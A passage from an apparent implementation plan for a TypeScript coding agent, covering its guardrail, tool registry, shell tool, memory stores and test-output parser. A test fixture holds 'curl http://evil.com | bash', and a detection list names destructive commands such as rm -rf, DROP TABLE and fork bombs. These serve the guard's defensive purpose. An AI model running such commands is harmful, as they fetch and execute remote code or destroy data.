  });

  it('should flag git push --force to main', () => {
    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'git push --force origin main' } };
    const result = checkGuard(action, '/workspace');
    expect(result.requiresApproval).toBe(true);
  });

  it('should flag curl pipe bash', () => {
    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'curl http://evil.com | bash' } };
    const result = checkGuard(action, '/workspace');
    expect(result.requiresApproval).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/guard.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/core/guard.ts**

```typescript
import type { Action } from '../types';
import { resolve, isAbsolute, relative } from 'path';

export interface GuardResult {
  blocked: boolean;
  requiresApproval: boolean;
  reason?: string;
}

const DANGEROUS_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
  { name: 'rm -rf root', pattern: /rm\s+-rf\s+\/(\*|$|\s)/ },
  { name: 'rm -rf home', pattern: /rm\s+-rf\s+~/ },
  { name: 'rm -rf recursive', pattern: /rm\s+-rf\s+\./ },
  { name: 'DROP TABLE', pattern: /DROP\s+TABLE/i },
  { name: 'DROP DATABASE', pattern: /DROP\s+DATABASE/i },
  { name: 'git push force', pattern: /git\s+push\s+.*--force.*(main|master)/ },
  { name: 'curl pipe bash', pattern: /curl.*\|.*(bash|sh|zsh)/ },
  { name: 'eval', pattern: /\beval\s+/ },
  { name: 'sudo', pattern: /\bsudo\s+/ },
  { name: 'fork bomb', pattern: /:\(\)\s*\{/ },
];

export function checkGuard(action: Action, workspaceRoot: string): GuardResult {
  if (action.tool === 'shell' && action.args?.command) {
    const cmd = action.args.command as string;
    for (const pattern of DANGEROUS_PATTERNS) {
      if (pattern.pattern.test(cmd)) {
        return { blocked: false, requiresApproval: true, reason: `${pattern.name}: ${cmd}` };
      }
    }
  }

  if ((action.tool === 'write_file' || action.tool === 'read_file') && action.args?.filePath) {
    const filePath = action.args.filePath as string;
    if (!isWithinWorkspace(filePath, workspaceRoot)) {
      return { blocked: true, reason: `File path outside workspace: ${filePath}` };
    }
  }

  return { blocked: false, requiresApproval: false };
}

function isWithinWorkspace(filePath: string, workspaceRoot: string): boolean {
  const resolved = isAbsolute(filePath) ? filePath : resolve(workspaceRoot, filePath);
  const rel = relative(workspaceRoot, resolved);
  return !rel.startsWith('..') && !isAbsolute(rel);
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/core/guard.test.ts
```
Expected: 9 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/guard.ts tests/core/guard.test.ts
git commit -m "feat: add guardrail system with dangerous command detection and workspace boundary"
```


### Task 9: Tool System (Types, Registry, All Tools)

**Files:**
- Create: `src/tools/types.ts`, `src/tools/registry.ts`, `src/tools/read-file.ts`, `src/tools/write-file.ts`, `src/tools/shell.ts`, `src/tools/run-test.ts`
- Test: `tests/tools/registry.test.ts`, `tests/tools/shell.test.ts`

**Interfaces:**
- Consumes: `ToolResult` from Task 2, `ToolDefinition` from Task 3
- Produces: `Tool` interface, `ToolRegistry` class, 4 tool implementations

- [ ] **Step 1: Write failing tests**

Create `tests/tools/registry.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { ToolRegistry } from '../../src/tools/registry';
import type { Tool } from '../../src/tools/types';
import type { ToolResult } from '../../src/types';

class FakeTool implements Tool {
  definition = { type: 'function' as const, function: { name: 'fake', description: 'fake', parameters: {} } };
  async execute(): Promise<ToolResult> { return { tool: 'fake', stdout: '', stderr: '', exitCode: 0, success: true }; }
}

describe('ToolRegistry', () => {
  it('should register and retrieve tools', () => {
    const registry = new ToolRegistry();
    const tool = new FakeTool();
    registry.register(tool);
    expect(registry.get('fake')).toBe(tool);
  });

  it('should throw for unregistered tool', () => {
    const registry = new ToolRegistry();
    expect(() => registry.get('unknown')).toThrow('Tool not found: unknown');
  });

  it('should return all tool definitions', () => {
    const registry = new ToolRegistry();
    registry.register(new FakeTool());
    const defs = registry.getDefinitions();
    expect(defs).toHaveLength(1);
    expect(defs[0].function.name).toBe('fake');
  });
});
```

Create `tests/tools/shell.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { execSync } from 'child_process';

describe('Shell tool', () => {
  it('should execute a simple command', () => {
    const result = execSync('echo hello', { encoding: 'utf-8' }).trim();
    expect(result).toBe('hello');
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/tools/registry.test.ts tests/tools/shell.test.ts
```
Expected: FAIL -- modules not found.

- [ ] **Step 3: Create src/tools/types.ts**

```typescript
import type { ToolResult } from '../types';
import type { ToolDefinition } from '../core/llm/types';

export interface ToolContext {
  workspaceRoot: string;
}

export interface Tool {
  definition: ToolDefinition;
  execute(args: Record<string, unknown>, context: ToolContext): Promise<ToolResult>;
}
```

- [ ] **Step 4: Create src/tools/registry.ts**

```typescript
import type { Tool } from './types';
import type { ToolDefinition } from '../core/llm/types';

export class ToolRegistry {
  private tools = new Map<string, Tool>();

  register(tool: Tool): void {
    this.tools.set(tool.definition.function.name, tool);
  }

  get(name: string): Tool {
    const tool = this.tools.get(name);
    if (!tool) throw new Error(`Tool not found: ${name}`);
    return tool;
  }

  getDefinitions(): ToolDefinition[] {
    return Array.from(this.tools.values()).map(t => t.definition);
  }
}
```

- [ ] **Step 5: Create src/tools/read-file.ts**

```typescript
import type { Tool } from './types';
import { readFileSync } from 'fs';
import { resolve } from 'path';

export const readFileTool: Tool = {
  definition: {
    type: 'function',
    function: {
      name: 'read_file',
      description: 'Read the contents of a file',
      parameters: {
        type: 'object',
        properties: { filePath: { type: 'string', description: 'Path to the file to read' } },
        required: ['filePath'],
      },
    },
  },
  async execute(args, context) {
    const filePath = resolve(context.workspaceRoot, args.filePath as string);
    const content = readFileSync(filePath, 'utf-8');
    return { tool: 'read_file', stdout: content, stderr: '', exitCode: 0, success: true };
  },
};
```

- [ ] **Step 6: Create src/tools/write-file.ts**

```typescript
import type { Tool } from './types';
import { writeFileSync, mkdirSync } from 'fs';
import { dirname, resolve } from 'path';

export const writeFileTool: Tool = {
  definition: {
    type: 'function',
    function: {
      name: 'write_file',
      description: 'Write content to a file, creating directories if needed',
      parameters: {
        type: 'object',
        properties: {
          filePath: { type: 'string', description: 'Path to the file to write' },
          content: { type: 'string', description: 'Content to write' },
        },
        required: ['filePath', 'content'],
      },
    },
  },
  async execute(args, context) {
    const filePath = resolve(context.workspaceRoot, args.filePath as string);
    const content = args.content as string;
    mkdirSync(dirname(filePath), { recursive: true });
    writeFileSync(filePath, content, 'utf-8');
    return { tool: 'write_file', stdout: `Written to ${filePath}`, stderr: '', exitCode: 0, success: true };
  },
};
```

- [ ] **Step 7: Create src/tools/shell.ts**

```typescript
import type { Tool } from './types';
import { execSync } from 'child_process';

export const shellTool: Tool = {
  definition: {
    type: 'function',
    function: {
      name: 'shell',
      description: 'Execute a shell command',
      parameters: {
        type: 'object',
        properties: { command: { type: 'string', description: 'Shell command to execute' } },
        required: ['command'],
      },
    },
  },
  async execute(args, context) {
    try {
      const stdout = execSync(args.command as string, {
        cwd: context.workspaceRoot,
        encoding: 'utf-8',
        timeout: 60000,
        maxBuffer: 10 * 1024 * 1024,
      });
      return { tool: 'shell', stdout, stderr: '', exitCode: 0, success: true };
    } catch (err: any) {
      return {
        tool: 'shell',
        stdout: err.stdout || '',
        stderr: err.stderr || err.message,
        exitCode: err.status || 1,
        success: false,
      };
    }
  },
};
```

- [ ] **Step 8: Create src/tools/run-test.ts**

```typescript
import type { Tool } from './types';
import { execSync } from 'child_process';

export const runTestTool: Tool = {
  definition: {
    type: 'function',
    function: {
      name: 'run_test',
      description: 'Run the project test suite',
      parameters: {
        type: 'object',
        properties: { command: { type: 'string', description: 'Test command, e.g. npm test', default: 'npm test' } },
      },
    },
  },
  async execute(args, context) {
    const cmd = (args.command as string) || 'npm test';
    try {
      const stdout = execSync(cmd, { cwd: context.workspaceRoot, encoding: 'utf-8', timeout: 120000, maxBuffer: 10 * 1024 * 1024 });
      return { tool: 'run_test', stdout, stderr: '', exitCode: 0, success: true };
    } catch (err: any) {
      return {
        tool: 'run_test',
        stdout: err.stdout || '',
        stderr: err.stderr || err.message,
        exitCode: err.status || 1,
        success: false,
      };
    }
  },
};
```

- [ ] **Step 9: Run tests to verify pass**

```bash
npx vitest run tests/tools/registry.test.ts tests/tools/shell.test.ts
```
Expected: 4 tests PASS.

- [ ] **Step 10: Commit**

```bash
git add src/tools/ tests/tools/
git commit -m "feat: add tool system with registry, read_file, write_file, shell, run_test"
```

---

### Task 10: Memory Layer (L1 Working Memory + L2 Session Store)

**Files:**
- Create: `src/memory/types.ts`, `src/memory/working-memory.ts`, `src/memory/session-store.ts`
- Test: `tests/memory/working-memory.test.ts`, `tests/memory/session-store.test.ts`

**Interfaces:**
- Consumes: `Message` from Task 2
- Produces: `WorkingMemory` class, `SessionStore` class, `SessionMemoryEntry` type

- [ ] **Step 1: Write failing test for WorkingMemory**

Create `tests/memory/working-memory.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { WorkingMemory } from '../../src/memory/working-memory';
import type { Message } from '../../src/types';

describe('WorkingMemory', () => {
  it('should add and retrieve messages', () => {
    const wm = new WorkingMemory(10);
    wm.add({ role: 'user', content: 'hello' });
    wm.add({ role: 'assistant', content: 'hi' });
    expect(wm.getAll()).toHaveLength(2);
  });

  it('should respect maxRounds limit', () => {
    const wm = new WorkingMemory(2);
    wm.add({ role: 'user', content: '1' });
    wm.add({ role: 'assistant', content: '2' });
    wm.add({ role: 'user', content: '3' });
    expect(wm.getAll()).toHaveLength(3);
    expect(wm.getAll()[0].content).toBe('1');
  });

  it('should get last N messages', () => {
    const wm = new WorkingMemory(10);
    wm.add({ role: 'user', content: 'a' });
    wm.add({ role: 'assistant', content: 'b' });
    wm.add({ role: 'user', content: 'c' });
    const last = wm.getLast(2);
    expect(last).toHaveLength(2);
    expect(last[0].content).toBe('b');
    expect(last[1].content).toBe('c');
  });

  it('should clear all messages', () => {
    const wm = new WorkingMemory(10);
    wm.add({ role: 'user', content: 'hello' });
    wm.clear();
    expect(wm.getAll()).toHaveLength(0);
  });
});
```

- [ ] **Step 2: Write failing test for SessionStore**

Create `tests/memory/session-store.test.ts`:

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { SessionStore } from '../../src/memory/session-store';

describe('SessionStore', () => {
  let store: SessionStore;

  beforeEach(() => {
    store = new SessionStore(':memory:');
  });

  it('should insert and retrieve entries', () => {
    store.insert({
      sessionId: 'sess-1',
      type: 'convention',
      content: 'Use tabs for indentation',
      metadata: '{}',
      keywords: 'indentation,tabs',
      timestamp: Date.now(),
      confidence: 1.0,
    });
    const results = store.search('indentation');
    expect(results).toHaveLength(1);
    expect(results[0].content).toBe('Use tabs for indentation');
  });

  it('should filter by sessionId', () => {
    store.insert({ sessionId: 'sess-1', type: 'convention', content: 'A', metadata: '{}', keywords: 'a', timestamp: Date.now(), confidence: 1.0 });
    store.insert({ sessionId: 'sess-2', type: 'convention', content: 'B', metadata: '{}', keywords: 'b', timestamp: Date.now(), confidence: 1.0 });
    const results = store.getBySession('sess-1');
    expect(results).toHaveLength(1);
    expect(results[0].content).toBe('A');
  });

  it('should delete entries by sessionId', () => {
    store.insert({ sessionId: 'sess-1', type: 'convention', content: 'A', metadata: '{}', keywords: 'a', timestamp: Date.now(), confidence: 1.0 });
    store.deleteSession('sess-1');
    expect(store.getBySession('sess-1')).toHaveLength(0);
  });
});
```

- [ ] **Step 3: Run tests to verify failure**

```bash
npx vitest run tests/memory/working-memory.test.ts tests/memory/session-store.test.ts
```
Expected: FAIL -- modules not found.

- [ ] **Step 4: Create src/memory/types.ts**

```typescript
export interface SessionMemoryEntry {
  id?: number;
  sessionId: string;
  type: 'task' | 'decision' | 'convention' | 'error' | 'guard_block' | 'test_result';
  content: string;
  metadata: string;
  keywords: string;
  timestamp: number;
  confidence: number;
}
```

- [ ] **Step 5: Create src/memory/working-memory.ts**

```typescript
import type { Message } from '../types';

export class WorkingMemory {
  private messages: Message[] = [];
  private maxRounds: number;

  constructor(maxRounds: number) {
    this.maxRounds = maxRounds;
  }

  add(message: Message): void {
    this.messages.push(message);
  }

  getAll(): Message[] {
    return [...this.messages];
  }

  getLast(n: number): Message[] {
    return this.messages.slice(-n);
  }

  clear(): void {
    this.messages = [];
  }
}
```

- [ ] **Step 6: Create src/memory/session-store.ts**

```typescript
import Database from 'better-sqlite3';
import type { SessionMemoryEntry } from './types';

export class SessionStore {
  private db: Database.Database;

  constructor(dbPath: string) {
    this.db = new Database(dbPath);
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS session_memory (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sessionId TEXT NOT NULL,
        type TEXT NOT NULL,
        content TEXT NOT NULL,
        metadata TEXT NOT NULL DEFAULT '{}',
        keywords TEXT NOT NULL DEFAULT '',
        timestamp INTEGER NOT NULL,
        confidence REAL NOT NULL DEFAULT 1.0
      );
      CREATE INDEX IF NOT EXISTS idx_session_id ON session_memory(sessionId);
      CREATE INDEX IF NOT EXISTS idx_type ON session_memory(type);
    `);
  }

  insert(entry: SessionMemoryEntry): void {
    const stmt = this.db.prepare(
      'INSERT INTO session_memory (sessionId, type, content, metadata, keywords, timestamp, confidence) VALUES (?, ?, ?, ?, ?, ?, ?)'
    );
    stmt.run(entry.sessionId, entry.type, entry.content, entry.metadata, entry.keywords, entry.timestamp, entry.confidence);
  }

  search(keyword: string, limit: number = 5): SessionMemoryEntry[] {
    const stmt = this.db.prepare(
      'SELECT * FROM session_memory WHERE keywords LIKE ? ORDER BY timestamp DESC LIMIT ?'
    );
    return stmt.all(`%${keyword}%`, limit) as SessionMemoryEntry[];
  }

  getBySession(sessionId: string): SessionMemoryEntry[] {
    return this.db.prepare('SELECT * FROM session_memory WHERE sessionId = ? ORDER BY timestamp DESC').all(sessionId) as SessionMemoryEntry[];
  }

  deleteSession(sessionId: string): void {
    this.db.prepare('DELETE FROM session_memory WHERE sessionId = ?').run(sessionId);
  }

  close(): void {
    this.db.close();
  }
}
```

- [ ] **Step 7: Run tests to verify pass**

```bash
npx vitest run tests/memory/working-memory.test.ts tests/memory/session-store.test.ts
```
Expected: 7 tests PASS.

- [ ] **Step 8: Commit**

```bash
git add src/memory/types.ts src/memory/working-memory.ts src/memory/session-store.ts tests/memory/
git commit -m "feat: add L1 working memory and L2 session store with SQLite"
```


### Task 11: Action Executor

**Files:**
- Create: `src/core/executor.ts`
- Test: `tests/core/executor.test.ts`

**Interfaces:**
- Consumes: `Action`, `ToolResult` from Task 2; `ToolRegistry` from Task 9; `GuardResult` from Task 8
- Produces: `executeAction(action: Action, registry: ToolRegistry, context: ToolContext): Promise<ToolResult>`

- [ ] **Step 1: Write failing test**

Create `tests/core/executor.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { executeAction } from '../../src/core/executor';
import { ToolRegistry } from '../../src/tools/registry';
import type { Tool } from '../../src/tools/types';
import type { ToolResult } from '../../src/types';

class EchoTool implements Tool {
  definition = { type: 'function' as const, function: { name: 'echo', description: 'echo', parameters: {} } };
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    return { tool: 'echo', stdout: `echo: ${args.text || ''}`, stderr: '', exitCode: 0, success: true };
  }
}

describe('executeAction', () => {
  it('should execute a registered tool', async () => {
    const registry = new ToolRegistry();
    registry.register(new EchoTool());
    const result = await executeAction(
      { type: 'tool_call', tool: 'echo', args: { text: 'hello' } },
      registry,
      { workspaceRoot: '/tmp' }
    );
    expect(result.tool).toBe('echo');
    expect(result.stdout).toBe('echo: hello');
  });

  it('should throw for unregistered tool', async () => {
    const registry = new ToolRegistry();
    await expect(
      executeAction({ type: 'tool_call', tool: 'unknown', args: {} }, registry, { workspaceRoot: '/tmp' })
    ).rejects.toThrow('Tool not found');
  });

  it('should throw for non-tool_call action', async () => {
    const registry = new ToolRegistry();
    await expect(
      executeAction({ type: 'stop', reason: 'done' }, registry, { workspaceRoot: '/tmp' })
    ).rejects.toThrow('Cannot execute non-tool action');
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/executor.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/core/executor.ts**

```typescript
import type { Action, ToolResult } from '../types';
import type { ToolRegistry } from '../tools/registry';
import type { ToolContext } from '../tools/types';

export async function executeAction(
  action: Action,
  registry: ToolRegistry,
  context: ToolContext
): Promise<ToolResult> {
  if (action.type !== 'tool_call' || !action.tool) {
    throw new Error(`Cannot execute non-tool action: ${action.type}`);
  }

  const tool = registry.get(action.tool);
  return tool.execute(action.args || {}, context);
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/core/executor.test.ts
```
Expected: 3 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/executor.ts tests/core/executor.test.ts
git commit -m "feat: add action executor that dispatches to tool registry"
```

---

### Task 12: Feedback Validator

**Files:**
- Create: `src/core/feedback.ts`
- Test: `tests/core/feedback.test.ts`

**Interfaces:**
- Consumes: `ToolResult` from Task 2
- Produces: `Feedback { verdict, shouldStop, summary, failures? }`, `validateFeedback(result: ToolResult): Feedback`

- [ ] **Step 1: Write failing test**

Create `tests/core/feedback.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { validateFeedback } from '../../src/core/feedback';
import type { ToolResult } from '../../src/types';

describe('validateFeedback', () => {
  it('should return pass for all tests passing', () => {
    const result: ToolResult = {
      tool: 'run_test', stdout: '3 passed, 0 failed', stderr: '', exitCode: 0, success: true,
    };
    const fb = validateFeedback(result);
    expect(fb.verdict).toBe('pass');
    expect(fb.shouldStop).toBe(true);
  });

  it('should return fail for failed tests', () => {
    const result: ToolResult = {
      tool: 'run_test', stdout: '1 passed, 2 failed', stderr: '', exitCode: 1, success: false,
    };
    const fb = validateFeedback(result);
    expect(fb.verdict).toBe('fail');
    expect(fb.shouldStop).toBe(false);
  });

  it('should return neutral for non-test tools', () => {
    const result: ToolResult = {
      tool: 'write_file', stdout: 'ok', stderr: '', exitCode: 0, success: true,
    };
    const fb = validateFeedback(result);
    expect(fb.verdict).toBe('neutral');
    expect(fb.shouldStop).toBe(false);
  });

  it('should parse Jest output', () => {
    const stdout = `PASS  src/test.ts
  + add(1, 2) should return 3
FAIL  src/calc.test.ts
  x multiply(2, 3) should return 6
    Expected: 6, Received: 5
Tests: 1 passed, 1 failed, 2 total`;
    const result: ToolResult = { tool: 'run_test', stdout, stderr: '', exitCode: 1, success: false };
    const fb = validateFeedback(result);
    expect(fb.verdict).toBe('fail');
    expect(fb.failures).toBeDefined();
    expect(fb.failures!.length).toBeGreaterThan(0);
  });

  it('should parse Mocha output', () => {
    const stdout = `  passing (2)
  failing (1)
  1) Calculator should multiply correctly:
     Error: expected 5 to equal 6`;
    const result: ToolResult = { tool: 'run_test', stdout, stderr: '', exitCode: 1, success: false };
    const fb = validateFeedback(result);
    expect(fb.verdict).toBe('fail');
  });

  it('should return neutral for empty stdout', () => {
    const result: ToolResult = { tool: 'run_test', stdout: '', stderr: '', exitCode: 0, success: true };
    const fb = validateFeedback(result);
    expect(fb.verdict).toBe('neutral');
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/feedback.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/core/feedback.ts**

```typescript
import type { ToolResult } from '../types';

export interface TestFailure {
  testName: string;
  error: string;
  expected?: string;
  actual?: string;
}

export interface Feedback {
  verdict: 'pass' | 'fail' | 'neutral';
  shouldStop: boolean;
  summary: string;
  failures?: TestFailure[];
}

export function validateFeedback(result: ToolResult): Feedback {
  if (result.tool !== 'run_test') {
    return { verdict: 'neutral', shouldStop: false, summary: `Executed ${result.tool}: ${result.success ? 'success' : 'failed'}` };
  }

  const stdout = result.stdout || '';
  const stderr = result.stderr || '';

  if (!stdout.trim() && !stderr.trim()) {
    return { verdict: 'neutral', shouldStop: false, summary: 'No test output produced' };
  }

  const failures = parseTestFailures(stdout + '\n' + stderr);

  if (result.exitCode === 0 && failures.length === 0) {
    const passedMatch = stdout.match(/(\d+)\s+passed/);
    const passed = passedMatch ? parseInt(passedMatch[1], 10) : 'all';
    return { verdict: 'pass', shouldStop: true, summary: `${passed} tests passed` };
  }

  return {
    verdict: 'fail',
    shouldStop: false,
    summary: `${failures.length} test(s) failed`,
    failures,
  };
}

function parseTestFailures(output: string): TestFailure[] {
  const failures: TestFailure[] = [];

  const lines = output.split('\n');
  let currentFailure: Partial<TestFailure> | null = null;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i].trim();

    const jestFailMatch = line.match(/^\s*[xX]\s+(.+)$/);
    const mochaFailMatch = line.match(/^\d+\)\s+(.+):$/);
    const vitestFailMatch = line.match(/^\s*FAIL\s+(.+)\s+>\s+(.+)$/);

    if (jestFailMatch) {
      if (currentFailure && currentFailure.testName) failures.push(currentFailure as TestFailure);
      currentFailure = { testName: jestFailMatch[1].trim() };
    } else if (mochaFailMatch) {
      if (currentFailure && currentFailure.testName) failures.push(currentFailure as TestFailure);
      currentFailure = { testName: mochaFailMatch[1].trim() };
    } else if (vitestFailMatch) {
      if (currentFailure && currentFailure.testName) failures.push(currentFailure as TestFailure);
      currentFailure = { testName: `${vitestFailMatch[1]} > ${vitestFailMatch[2]}`.trim() };
    } else if (currentFailure && line.startsWith('Expected:')) {
      currentFailure.expected = line.replace('Expected:', '').trim();
    } else if (currentFailure && line.startsWith('Received:')) {
      currentFailure.actual = line.replace('Received:', '').trim();
    } else if (currentFailure && line && !line.startsWith('PASS') && !line.startsWith('Tests:')) {
      if (!currentFailure.error) {
        currentFailure.error = line;
      } else if (currentFailure.error.length < 500) {
        currentFailure.error += '\n' + line;
      }
    }
  }

  if (currentFailure && currentFailure.testName) {
    failures.push(currentFailure as TestFailure);
  }

  if (failures.length === 0 && output.includes('fail')) {
    failures.push({ testName: 'unknown', error: output.slice(0, 500) });
  }

  return failures;
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/core/feedback.test.ts
```
Expected: 6 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/feedback.ts tests/core/feedback.test.ts
git commit -m "feat: add feedback validator with test output parsing (Jest/Mocha/Vitest)"
```


### Task 13: L2 Session Retriever

**Files:**
- Create: `src/memory/session-retriever.ts`
- Test: `tests/memory/session-retriever.test.ts`

**Interfaces:**
- Consumes: `SessionStore` from Task 10
- Produces: `SessionRetriever` class with `retrieve(query: string, topK: number): Promise<SessionMemoryEntry[]>`

- [ ] **Step 1: Write failing test**

Create `tests/memory/session-retriever.test.ts`:

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { SessionStore } from '../../src/memory/session-store';
import { SessionRetriever } from '../../src/memory/session-retriever';

describe('SessionRetriever', () => {
  let store: SessionStore;
  let retriever: SessionRetriever;

  beforeEach(() => {
    store = new SessionStore(':memory:');
    retriever = new SessionRetriever(store);
  });

  it('should retrieve entries by keyword match', async () => {
    store.insert({ sessionId: 's1', type: 'convention', content: 'Use tabs', metadata: '{}', keywords: 'indentation,tabs', timestamp: 1000, confidence: 1.0 });
    store.insert({ sessionId: 's1', type: 'convention', content: 'Use spaces', metadata: '{}', keywords: 'indentation,spaces', timestamp: 2000, confidence: 1.0 });
    const results = await retriever.retrieve('indentation', 5);
    expect(results).toHaveLength(2);
  });

  it('should respect topK limit', async () => {
    store.insert({ sessionId: 's1', type: 'convention', content: 'A', metadata: '{}', keywords: 'a', timestamp: 1000, confidence: 1.0 });
    store.insert({ sessionId: 's1', type: 'convention', content: 'B', metadata: '{}', keywords: 'a', timestamp: 2000, confidence: 1.0 });
    store.insert({ sessionId: 's1', type: 'convention', content: 'C', metadata: '{}', keywords: 'a', timestamp: 3000, confidence: 1.0 });
    const results = await retriever.retrieve('a', 2);
    expect(results).toHaveLength(2);
  });

  it('should return empty array for no match', async () => {
    const results = await retriever.retrieve('nonexistent', 5);
    expect(results).toHaveLength(0);
  });

  it('should filter low confidence entries', async () => {
    store.insert({ sessionId: 's1', type: 'convention', content: 'Good', metadata: '{}', keywords: 'rule', timestamp: 1000, confidence: 0.9 });
    store.insert({ sessionId: 's1', type: 'convention', content: 'Bad', metadata: '{}', keywords: 'rule', timestamp: 2000, confidence: 0.3 });
    const results = await retriever.retrieve('rule', 5);
    expect(results).toHaveLength(1);
    expect(results[0].content).toBe('Good');
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/memory/session-retriever.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/memory/session-retriever.ts**

```typescript
import type { SessionStore } from './session-store';
import type { SessionMemoryEntry } from './types';

const MIN_CONFIDENCE = 0.5;

export class SessionRetriever {
  private store: SessionStore;

  constructor(store: SessionStore) {
    this.store = store;
  }

  async retrieve(query: string, topK: number = 5): Promise<SessionMemoryEntry[]> {
    const keywords = extractKeywords(query);
    const allResults: SessionMemoryEntry[] = [];

    for (const keyword of keywords) {
      const results = this.store.search(keyword, topK * 2);
      for (const r of results) {
        if (!allResults.find(e => e.id === r.id)) {
          allResults.push(r);
        }
      }
    }

    return allResults
      .filter(e => e.confidence >= MIN_CONFIDENCE)
      .sort((a, b) => b.timestamp - a.timestamp)
      .slice(0, topK);
  }
}

function extractKeywords(query: string): string[] {
  const words = query.toLowerCase().split(/\s+/).filter(w => w.length > 1);
  return [...new Set(words)];
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/memory/session-retriever.test.ts
```
Expected: 4 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/memory/session-retriever.ts tests/memory/session-retriever.test.ts
git commit -m "feat: add L2 session retriever with keyword extraction and confidence filtering"
```

---

### Task 14: Context Injector and Compressor

**Files:**
- Create: `src/memory/context-injector.ts`, `src/memory/compressor.ts`
- Test: `tests/memory/context-injector.test.ts`, `tests/memory/compressor.test.ts`

**Interfaces:**
- Consumes: `SessionRetriever` from Task 13, `WorkingMemory` from Task 10, `Message` from Task 2
- Produces: `ContextInjector` class, `Compressor` class

- [ ] **Step 1: Write failing tests**

Create `tests/memory/context-injector.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { ContextInjector } from '../../src/memory/context-injector';
import { SessionRetriever } from '../../src/memory/session-retriever';
import { SessionStore } from '../../src/memory/session-store';
import { WorkingMemory } from '../../src/memory/working-memory';
import type { Message } from '../../src/types';

describe('ContextInjector', () => {
  it('should inject retrieved memory into messages', async () => {
    const store = new SessionStore(':memory:');
    store.insert({ sessionId: 's1', type: 'convention', content: 'Use tabs', metadata: '{}', keywords: 'tabs,indentation', timestamp: Date.now(), confidence: 1.0 });
    const retriever = new SessionRetriever(store);
    const wm = new WorkingMemory(10);
    const injector = new ContextInjector(retriever, wm);

    const messages: Message[] = [
      { role: 'system', content: 'You are a coding agent.' },
      { role: 'user', content: 'Write code with tabs indentation' },
    ];

    const result = await injector.inject(messages, 's1');
    expect(result.length).toBeGreaterThanOrEqual(3);
    const injected = result[1];
    expect(injected.role).toBe('system');
    expect(injected.content).toContain('Use tabs');
  });

  it('should return original messages when no memory matches', async () => {
    const store = new SessionStore(':memory:');
    const retriever = new SessionRetriever(store);
    const wm = new WorkingMemory(10);
    const injector = new ContextInjector(retriever, wm);

    const messages: Message[] = [
      { role: 'system', content: 'You are a coding agent.' },
      { role: 'user', content: 'Hello' },
    ];

    const result = await injector.inject(messages, 's1');
    expect(result).toEqual(messages);
  });
});
```

Create `tests/memory/compressor.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { Compressor } from '../../src/memory/compressor';
import type { Message } from '../../src/types';

describe('Compressor', () => {
  it('should return original messages when under limit', () => {
    const compressor = new Compressor();
    const messages: Message[] = [
      { role: 'system', content: 'System prompt' },
      { role: 'user', content: 'Hello' },
    ];
    const result = compressor.compress(messages, 1000, 'truncate');
    expect(result).toEqual(messages);
  });

  it('should truncate middle messages in truncate mode', () => {
    const compressor = new Compressor();
    const messages: Message[] = [
      { role: 'system', content: 'System prompt' },
      { role: 'user', content: 'A'.repeat(500) },
      { role: 'assistant', content: 'B'.repeat(500) },
      { role: 'user', content: 'Recent message' },
    ];
    const result = compressor.compress(messages, 50, 'truncate');
    expect(result.length).toBeLessThan(messages.length);
    expect(result[0].content).toBe('System prompt');
    const lastMsg = result[result.length - 1];
    expect(lastMsg.content).toBe('Recent message');
  });

  it('should insert truncation marker', () => {
    const compressor = new Compressor();
    const messages: Message[] = [
      { role: 'system', content: 'System prompt' },
      { role: 'user', content: 'A'.repeat(500) },
      { role: 'user', content: 'Last message' },
    ];
    const result = compressor.compress(messages, 50, 'truncate');
    const hasMarker = result.some(m => m.role === 'system' && m.content?.includes('truncated'));
    expect(hasMarker).toBe(true);
  });
});
```

- [ ] **Step 2: Run tests to verify failure**

```bash
npx vitest run tests/memory/context-injector.test.ts tests/memory/compressor.test.ts
```
Expected: FAIL -- modules not found.

- [ ] **Step 3: Create src/memory/context-injector.ts**

```typescript
import type { SessionRetriever } from './session-retriever';
import type { WorkingMemory } from './working-memory';
import type { Message } from '../types';

export class ContextInjector {
  private retriever: SessionRetriever;
  private workingMemory: WorkingMemory;

  constructor(retriever: SessionRetriever, workingMemory: WorkingMemory) {
    this.retriever = retriever;
    this.workingMemory = workingMemory;
  }

  async inject(messages: Message[], sessionId: string): Promise<Message[]> {
    const lastUserMsg = [...messages].reverse().find(m => m.role === 'user');
    if (!lastUserMsg || !lastUserMsg.content) return messages;

    const query = lastUserMsg.content;
    const entries = await this.retriever.retrieve(query, 5);

    if (entries.length === 0) return messages;

    const memoryContent = entries
      .map(e => `[${e.type}] ${e.content}`)
      .join('\n');

    const memoryMsg: Message = {
      role: 'system',
